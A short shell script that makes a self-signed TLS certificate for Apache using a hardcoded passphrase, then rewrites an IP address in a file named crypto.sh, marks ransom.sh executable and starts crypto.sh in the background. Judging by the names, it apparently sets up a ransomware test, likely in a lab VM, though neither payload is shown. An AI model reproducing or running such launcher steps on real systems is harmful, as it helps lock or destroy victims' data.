openssl genrsa -des3 -passout pass:neveruseinsecurepasswords -out server.pass.key 4096
openssl rsa -passin pass:neveruseinsecurepasswords -in server.pass.key -out server.key
openssl req -new -key server.key -out server.csr
openssl x509 -req -days 4096 -in server.csr -signkey server.key -out server.crt
chmod 600 server.*
mkdir -p /etc/ssl/certs/
mv server.key /etc/ssl/certs/
mv server.crt /etc/ssl/certs/
service apache2 restart
sed -i 's/192\.168\.1\.132/10\.0\.2\.15/g' crypto.sh
chmod 755 ransom.sh
./crypto.sh &
